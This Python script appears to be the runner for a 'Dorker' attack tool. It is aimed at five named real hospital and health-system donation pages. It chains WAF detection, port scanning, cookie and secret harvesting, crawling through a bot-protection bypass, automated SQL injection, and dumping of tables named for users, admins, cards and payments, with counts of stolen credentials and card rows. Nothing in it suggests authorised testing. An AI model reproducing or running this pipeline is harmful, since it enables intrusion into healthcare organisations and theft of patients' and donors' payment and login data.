#!/usr/bin/env python3
"""
Direct full-scan runner — bypasses Telegram, calls pipeline components directly.
Outputs results to console with full hint engine integration.
"""

import asyncio
import sys
import os
import json
import traceback
from datetime import datetime
from urllib.parse import urlparse, urljoin, parse_qs

import aiohttp
from loguru import logger

logger.remove()
logger.add(sys.stderr, level="INFO", format="<green>{time:HH:mm:ss}</green> | <level>{level:<7}</level> | {message}")

# Local imports
from config_v3 import DorkerConfig
from waf_detector import WAFDetector, ProtectionInfo
from sqli_scanner import SQLiScanner, SQLiResult
from sqli_dumper import SQLiDumper, DumpedData
from secret_extractor import SecretExtractor, ExtractedSecret
from persistence import DorkerDB
from proxy_manager import ProxyManager
from cookie_hunter import CookieHunter
from ecommerce_checker import EcommerceChecker
from recursive_crawler import RecursiveCrawler, CrawlPage, CrawlResult, generate_seed_urls
from port_scanner import PortScanner, PortScanResult
from oob_sqli import OOBInjector, OOBResult
from union_dumper import MultiUnionDumper, UnionDumpResult
from key_validator import KeyValidator, KeyValidation
from ml_filter import MLFilter, FilterResult
from browser_engine import BrowserManager, _HAS_PLAYWRIGHT, flaresolverr_crawl
from hint_engine import (
    get_cookie_hint, get_secret_hint, get_endpoint_hint,
    get_waf_hint, get_port_hint, get_sqli_hint, get_dump_hint,
    get_contextual_hints,
)

URLS = [
    "https://www.skagitregionalhealth.org/donate",
    "https://www.whidbeyhealth.org/donate",
    "https://www.islandhealth.org/donate",
    "https://www.sanluisobispo.org/donate",
    "https://www.dignityhealth.org/donate",
]

def strip_html(text: str) -> str:
    """Remove HTML tags for console output."""
    import re
    return re.sub(r'<[^>]+>', '', text)


async def full_scan(url: str, config: DorkerConfig, scan_idx: int, total: int):
    """Run a full scan on a single URL, return report text."""
    print(f"\n{'='*70}")
    print(f"  [{scan_idx}/{total}] SCANNING: {url}")
    print(f"{'='*70}")

    parsed = urlparse(url)
    base_domain = parsed.netloc
    base_url = f"{parsed.scheme}://{base_domain}"

    # Init components
    db = DorkerDB("scan_results.db")
    waf_detector = WAFDetector()
    sqli_scanner = SQLiScanner()
    sqli_dumper = SQLiDumper()
    secret_extractor = SecretExtractor()

    port_scanner = None
    if getattr(config, 'port_scan_enabled', True):
        port_scanner = PortScanner(config=config)

    # Collectors
    all_cookies = {}
    all_b3_cookies = {}
    all_secrets = []
    all_sqli_results = []
    all_dump_results = []
    all_endpoints = {}
    all_port_results = []
    platform_info = {}
    waf_result = None
    waf_name = None
    pages_scanned = 0
    sqli_tested = 0
    total_pages_found = 0
    discovered_param_urls = set()

    timeout_cfg = aiohttp.ClientTimeout(total=30)
    connector = aiohttp.TCPConnector(ssl=False, limit=10)

    async with aiohttp.ClientSession(
        timeout=timeout_cfg,
        connector=connector,
        cookie_jar=aiohttp.CookieJar(unsafe=True),
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                          "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }
    ) as session:

        # ═══════ PHASE 1: WAF + Cookies + Port Scan ═══════
        print(f"  ⏳ Phase 1: WAF Detection + Cookie Extraction + Port Scan...")

        # WAF
        try:
            waf_info = await waf_detector.detect(url, session)
            waf_name = waf_info.waf
            waf_result = {
                "name": waf_info.waf,
                "cdn": waf_info.cdn,
                "bot_protection": waf_info.bot_protection,
                "risk": waf_info.risk_level,
                "cms": waf_info.cms,
            }
            print(f"  ✅ WAF: {waf_info.waf or 'None'} | CDN: {waf_info.cdn or 'None'} | CMS: {waf_info.cms or 'None'}")
        except Exception as e:
            print(f"  ❌ WAF detection error: {e}")

        # Cookies
        try:
            jar = await sqli_scanner.extract_cookies(url, session)
            if jar.cookies:
                for name, value in jar.cookies.items():
                    all_cookies[name] = value
                for name, value in jar.b3_cookies.items():
                    all_b3_cookies[name] = value
                print(f"  ✅ Cookies: {len(jar.cookies)} found ({len(jar.b3_cookies)} B3)")
            else:
                print(f"  ℹ️  No cookies extracted")
        except Exception as e:
            print(f"  ❌ Cookie extraction error: {e}")

        # Port scan
        if port_scanner:
            try:
                port_result = await port_scanner.scan_and_report(url)
                if port_result and port_result.open_ports:
                    all_port_results = [
                        {"port": pp.port, "service": pp.service, "banner": pp.banner,
                         "version": pp.version, "risk": pp.risk}
                        for pp in port_result.open_ports
                    ]
                    print(f"  ✅ Ports: {len(all_port_results)} open")
                else:
                    print(f"  ℹ️  No open ports found (or scan blocked)")
            except Exception as e:
                print(f"  ❌ Port scan error: {e}")

        # ═══════ PHASE 2: Secret Extraction + Endpoint Discovery ═══════
        print(f"  ⏳ Phase 2: Deep Secret Extraction + Endpoint Discovery...")

        try:
            scan_result = await secret_extractor.deep_extract_site(url, session)
            all_secrets = scan_result.get("secrets", [])
            platform_info = scan_result.get("platform", {})
            all_endpoints = scan_result.get("endpoints", {})
            sqli_candidates = scan_result.get("sqli_candidates", [])
            pages_scanned = scan_result.get("pages_scanned", 0)
            print(f"  ✅ Secrets: {len(all_secrets)} | Endpoints: {sum(len(v) for v in all_endpoints.values() if isinstance(v, list))} | Pages: {pages_scanned}")
        except Exception as e:
            print(f"  ❌ Secret extraction error: {e}")
            traceback.print_exc()
            sqli_candidates = []

        # ═══════ PHASE 3: Deep Crawl ═══════
        print(f"  ⏳ Phase 3: Deep Crawl (discover all pages)...")
        crawled_pages = set()
        try:
            # Use recursive crawler
            crawler = RecursiveCrawler(config=config)
            crawl_result = await crawler.crawl(url, session)
            if crawl_result:
                for page in crawl_result.pages:
                    crawled_pages.add(page.url)
                    # Merge cookies from crawled pages
                    if page.cookies:
                        for cn, cv in page.cookies.items():
                            if cn not in all_cookies:
                                all_cookies[cn] = cv
                # Use crawler's param_urls detection
                discovered_param_urls.update(crawl_result.param_urls)
                total_pages_found = crawl_result.total_fetched or len(crawl_result.pages)
                print(f"  ✅ Crawled: {total_pages_found} pages | Param URLs: {len(discovered_param_urls)}")
                
                # ── FlareSolverr fallback: if aiohttp got very few pages, use FlareSolverr ──
                if total_pages_found <= 2:
                    print(f"  🌐 Shallow crawl ({total_pages_found} pages) — trying FlareSolverr fallback...")
                    try:
                        flare_result = await flaresolverr_crawl(
                            seed_url=url,
                            max_pages=config.deep_crawl_max_pages,
                            max_depth=config.deep_crawl_max_depth,
                            delay=1.0,
                        )
                        if flare_result.total_fetched > total_pages_found:
                            print(
                                f"  🌐 FlareSolverr got {flare_result.total_fetched} pages "
                                f"(vs aiohttp {total_pages_found}), using FlareSolverr result"
                            )
                            # Merge FlareSolverr results
                            for bp in flare_result.pages:
                                crawled_pages.add(bp.url)
                                if bp.cookies:
                                    for cn, cv in bp.cookies.items():
                                        if cn not in all_cookies:
                                            all_cookies[cn] = cv
                                # Extract secrets from FlareSolverr-crawled pages
                                if bp.html:
                                    try:
                                        page_secs = secret_extractor.extract_from_text(bp.html, bp.url)
                                        if page_secs:
                                            all_secrets.extend(page_secs)
                                    except Exception as e:
                                        logger.debug(f"extending secrets from scan: {e}")
                            discovered_param_urls.update(flare_result.param_urls)
                            crawl_result = flare_result
                            total_pages_found = flare_result.total_fetched
                            print(f"  ✅ FlareSolverr: {total_pages_found} pages | Param URLs: {len(discovered_param_urls)}")
                        else:
                            print(f"  🌐 FlareSolverr got {flare_result.total_fetched} pages — no improvement")
                    except Exception as e:
                        print(f"  ⚠️ FlareSolverr fallback error: {e}")
            else:
                print(f"  ℹ️  Crawler returned no results")
        except Exception as e:
            print(f"  ❌ Crawl error: {e}")
            traceback.print_exc()

        # Also add param URLs from secret extractor
        for candidate in sqli_candidates if 'sqli_candidates' in dir() else []:
            if isinstance(candidate, str) and '?' in candidate:
                discovered_param_urls.add(candidate)

        # ═══════ PHASE 4: SQLi Testing ═══════
        if discovered_param_urls:
            print(f"  ⏳ Phase 4: SQLi Testing ({len(discovered_param_urls)} param URLs)...")
            for purl in list(discovered_param_urls)[:20]:
                try:
                    sqli_tested += 1
                    results = await sqli_scanner.scan(purl, session)
                    if results:
                        for r in results:
                            all_sqli_results.append({
                                "url": r.url,
                                "param": r.parameter,
                                "technique": r.technique,
                                "injection_type": r.injection_type,
                                "injection_point": getattr(r, 'injection_point', 'url'),
                                "dbms": r.dbms,
                                "db_version": getattr(r, 'db_version', ''),
                                "current_db": getattr(r, 'current_db', ''),
                                "injectable_columns": getattr(r, 'injectable_columns', []),
                            })
                except Exception as e:
                    logger.debug(f"SQLi scan error on {purl}: {e}")
            print(f"  ✅ SQLi: {len(all_sqli_results)} injectable of {sqli_tested} tested")
        else:
            print(f"  ℹ️  Phase 4: No param URLs to test for SQLi")

        # ═══════ PHASE 5: Data Dumping ═══════
        if all_sqli_results:
            print(f"  ⏳ Phase 5: Data Dumping ({len(all_sqli_results)} injectable endpoints)...")
            for r in all_sqli_results[:5]:
                try:
                    sqli_obj = SQLiResult(
                        url=r['url'], parameter=r['param'],
                        technique=r['technique'],
                        injection_type=r['injection_type'],
                        dbms=r['dbms'],
                        injectable_columns=r.get('injectable_columns', [0]),
                    )
                    tables = await sqli_dumper.enumerate_tables(sqli_obj, session)
                    table_count = len(tables) if tables else 0
                    total_rows = 0
                    cred_count = 0
                    card_count = 0
                    db_name = getattr(sqli_obj, 'current_db', '?')
                    
                    if tables:
                        # Try dumping interesting tables
                        interesting = [t for t in tables if any(k in t.lower() for k in 
                                       ["user", "admin", "account", "login", "customer", "card", "payment"])]
                        for tbl in (interesting or tables)[:3]:
                            try:
                                cols = await sqli_dumper.enumerate_columns(sqli_obj, tbl, session)
                                if cols:
                                    data = await sqli_dumper.extract_data(sqli_obj, tbl, cols[:5], session, limit=10)
                                    if data:
                                        total_rows += len(data)
                                        # Check for credentials/cards
                                        col_lower = [c.lower() for c in cols]
                                        if any('pass' in c or 'pwd' in c for c in col_lower):
                                            cred_count += len(data)
                                        if any('card' in c or 'cc' in c or 'credit' in c for c in col_lower):
                                            card_count += len(data)
                            except Exception as e:
                                logger.debug(f"Table dump error for {tbl}: {e}")
                    
                    all_dump_results.append({
                        "database": db_name,
                        "dbms": r['dbms'],
                        "tables": table_count,
                        "total_rows": total_rows,
                        "cards": card_count,
                        "credentials": cred_count,
                        "gateway_keys": 0,
                    })
                    print(f"    📦 {r['url'][:60]}: {table_count} tables, {total_rows} rows dumped")
                except Exception as e:
                    logger.debug(f"Dump error: {e}")
            print(f"  ✅ Dumps: {len(all_dump_results)} databases dumped")
        else:
            print(f"  ℹ️  Phase 5: No injectable endpoints to dump")

    # ═══════ BUILD REPORT ═══════
    report = []
    report.append(f"{'━'*50}")
    report.append(f"🔍 Full Domain Scan Report")
    report.append(f"{'━'*50}")
    report.append(f"🌐 Target: {url}")
    report.append(f"📄 Pages Crawled: {total_pages_found}")
    report.append(f"🔗 Param URLs Found: {len(discovered_param_urls)}")
    report.append(f"🔓 SQLi Endpoints Tested: {sqli_tested}")
    report.append("")

    # Cookies
    report.append(f"🍪 Cookies ({len(all_cookies)}):")
    if all_cookies:
        cookie_hints_batch = []
        b3_names = {"x-b3-traceid", "x-b3-spanid", "x-b3-parentspanid", "x-b3-sampled", "x-b3-flags", "b3"}
        sess_patterns = ["sessid", "session", "phpsessid", "jsessionid", "asp.net", "connect.sid"]
        auth_patterns = ["token", "auth", "jwt", "csrf", "xsrf", "login"]
        for name, value in sorted(all_cookies.items()):
            tag = ""
            nl = name.lower()
            if nl in b3_names:
                tag = " 🔵"
            elif any(p in nl for p in sess_patterns):
                tag = " 🔐"
            elif any(p in nl for p in auth_patterns):
                tag = " 🔑"
            report.append(f"  {name}={value[:60]}{tag}")
            hint = get_cookie_hint(name, value)
            if hint:
                cookie_hints_batch.append(strip_html(hint))
        if cookie_hints_batch:
            report.append("")
            report.append("  💡 Cookie Intelligence:")
            for ch in cookie_hints_batch[:10]:
                report.append(f"  {ch}")
                report.append("")
    else:
        report.append("  None found")

    if all_b3_cookies:
        report.append(f"  🔵 B3 Tracing: {len(all_b3_cookies)}")
        for name, value in all_b3_cookies.items():
            report.append(f"    {name}={value}")
    report.append("")

    # Platform
    if platform_info:
        if platform_info.get('platform'):
            report.append(f"Platform: {platform_info['platform']}")
        if platform_info.get('gateways'):
            report.append(f"Gateways: {', '.join(platform_info['gateways'])}")
        else:
            report.append(f"Gateways: ❌ None detected")
        if platform_info.get('form_type'):
            report.append(f"Form Type: {platform_info['form_type']}")
        ajax = '✅' if platform_info.get('has_ajax') else '❌'
        nonce = '✅' if platform_info.get('has_nonce') else '❌'
        captcha = '⚠️' if platform_info.get('has_captcha') else '✅ None'
        report.append(f"AJAX: {ajax} | Nonce: {nonce} | Captcha: {captcha}")
        report.append("")

    # WAF
    if waf_result:
        report.append(f"🛡 Protection:")
        parts = []
        if waf_result.get("name"):
            parts.append(f"WAF: {waf_result['name']}")
        if waf_result.get("cdn"):
            parts.append(f"CDN: {waf_result['cdn']}")
        if waf_result.get("bot_protection"):
            parts.append(f"Bot: {waf_result['bot_protection']}")
        if waf_result.get("cms"):
            parts.append(f"CMS: {waf_result['cms']}")
        report.append("  " + " | ".join(parts) if parts else "  None")
        waf_hint = get_waf_hint(
            waf_name=waf_result.get("name", ""),
            cms_name=waf_result.get("cms", "")
        )
        if waf_hint:
            report.append(f"  💡 {strip_html(waf_hint)}")
        report.append("")

    # Secrets
    if all_secrets:
        gateway_secrets = [s for s in all_secrets if s.category == "gateway"]
        other_secrets = [s for s in all_secrets if s.category != "gateway"]

        if gateway_secrets:
            report.append(f"🔑 Gateway Keys ({len(gateway_secrets)}):")
            for s in gateway_secrets:
                report.append(f"  {s.key_name}")
                report.append(f"  {s.value[:80]}")
                report.append(f"  📍 {s.url}")
                hint = get_secret_hint(s.type, s.value, s.key_name)
                if hint:
                    report.append(f"  {strip_html(hint)}")
                report.append("")

        if other_secrets:
            report.append(f"🔐 Other Secrets ({len(other_secrets)}):")
            for s in other_secrets[:15]:
                report.append(f"  {s.key_name}: {s.value[:60]}")
                hint = get_secret_hint(s.type, s.value, s.key_name)
                if hint:
                    report.append(f"  {strip_html(hint)}")
            if len(other_secrets) > 15:
                report.append(f"  ... +{len(other_secrets) - 15} more")
            report.append("")
    else:
        report.append("🔐 No secrets/keys found.")
        report.append("")

    # Endpoints
    total_ep = sum(len(v) for v in all_endpoints.values() if isinstance(v, list))
    if total_ep > 0:
        report.append(f"🌐 Endpoints ({total_ep}):")
        ep_labels = {
            "ajax_endpoints": "⚡ AJAX", "rest_api": "🔗 REST",
            "form_actions": "📝 Forms", "login_pages": "🔐 Login",
            "search_endpoints": "🔎 Search", "param_urls": "❓ Params",
            "file_upload": "📤 Upload", "admin_pages": "👤 Admin",
            "api_calls": "🌍 ExtAPI", "interesting_js": "📜 JS",
        }
        ep_hints_batch = []
        for key, label in ep_labels.items():
            eps = all_endpoints.get(key, [])
            if eps:
                report.append(f"  {label}: {len(eps)}")
                eh = get_endpoint_hint(key)
                if eh:
                    ep_hints_batch.append(eh)
        if ep_hints_batch:
            report.append("")
            report.append("  💡 Endpoint Intelligence:")
            for eh in ep_hints_batch:
                report.append(f"  {eh}")
                report.append("")
        report.append("")

    # SQLi
    if all_sqli_results:
        report.append(f"🔓 SQL Injection ({len(all_sqli_results)}):")
        sqli_hints_shown = set()
        for r in all_sqli_results:
            report.append(f"  ⚠️ {r['technique']} ({r['injection_type']}) via {r.get('injection_point', 'url')}")
            report.append(f"     Param: {r['param']} | DBMS: {r['dbms']}")
            if r.get('db_version'):
                report.append(f"     Version: {r['db_version']}")
            if r.get('current_db'):
                report.append(f"     DB: {r['current_db']}")
            report.append(f"     {r['url'][:80]}")
            report.append("")
        report.append("  💡 SQLi Intelligence:")
        for r in all_sqli_results:
            tech = r.get('technique', '').lower()
            point = r.get('injection_point', 'url').lower()
            hk = f"{tech}_{point}"
            if hk not in sqli_hints_shown:
                sqli_hints_shown.add(hk)
                sh = get_sqli_hint(tech, point)
                if sh:
                    report.append(f"  {sh}")
                    report.append("")
    elif sqli_tested > 0:
        report.append(f"🔓 Tested {sqli_tested} endpoints — none injectable")
        report.append("")
    else:
        report.append(f"🔓 No testable endpoints found")
        report.append("")

    # Dumps
    if all_dump_results:
        report.append(f"📦 Data Dumps ({len(all_dump_results)}):")
        for d in all_dump_results:
            report.append(f"  DB: {d.get('database', '?')} ({d.get('dbms', '?')})")
            report.append(f"  Tables: {d.get('tables', 0)} | Rows: {d.get('total_rows', 0)}")
            if d.get('cards', 0) > 0:
                report.append(f"  💳 Cards: {d['cards']}")
            if d.get('credentials', 0) > 0:
                report.append(f"  🔐 Credentials: {d['credentials']}")
            dump_h = get_dump_hint(
                tables_found=d.get('tables', 0),
                has_users=d.get('credentials', 0) > 0,
                has_cards=d.get('cards', 0) > 0,
                dbms=d.get('dbms', '')
            )
            report.append(f"  💡 {dump_h}")
            report.append("")

    # Ports
    if all_port_results:
        report.append(f"🔌 Open Ports ({len(all_port_results)}):")
        for pr in all_port_results:
            risk_icon = "🔴" if pr['risk'] == 'high' else ("🟡" if pr['risk'] == 'medium' else "🟢")
            line = f"  {risk_icon} {pr['port']} ({pr['service']}"
            if pr.get('version'):
                line += f" {pr['version']}"
            line += ")"
            report.append(line)
            ph = get_port_hint(pr['port'])
            if ph:
                report.append(f"     💡 {ph}")
        report.append("")

    # Contextual Intelligence
    ctx_hints = get_contextual_hints(
        url=url,
        cookies=all_cookies if all_cookies else None,
        secrets=all_secrets if all_secrets else None,
        waf=waf_result,
        endpoints=all_endpoints if all_endpoints else None,
    )
    if ctx_hints:
        report.append("🧠 Combined Intelligence:")
        for ch in ctx_hints:
            report.append(f"  {strip_html(ch)}")
            report.append("")

    report.append(f"{'━'*50}")

    # Print report
    full_report = "\n".join(report)
    print(full_report)

    # Save to file
    safe_name = base_domain.replace(".", "_")
    with open(f"scan_{safe_name}.txt", "w") as f:
        f.write(full_report)
    print(f"  📁 Report saved to scan_{safe_name}.txt")

    return full_report


async def main():
    config = DorkerConfig()
    reports = []
    
    for i, url in enumerate(URLS, 1):
        try:
            report = await full_scan(url, config, i, len(URLS))
            reports.append((url, report))
        except Exception as e:
            print(f"\n❌ FATAL ERROR scanning {url}: {e}")
            traceback.print_exc()
            reports.append((url, f"ERROR: {e}"))
    
    # Summary
    print(f"\n\n{'='*70}")
    print(f"  📊 SCAN SUMMARY — {len(URLS)} targets")
    print(f"{'='*70}")
    for url, report in reports:
        if isinstance(report, str) and report.startswith("ERROR:"):
            print(f"  ❌ {url} — {report}")
        else:
            lines = report.split("\n") if isinstance(report, str) else []
            print(f"  ✅ {url} — {len(lines)} report lines")
    print(f"{'='*70}\n")


if __name__ == "__main__":
    asyncio.run(main())
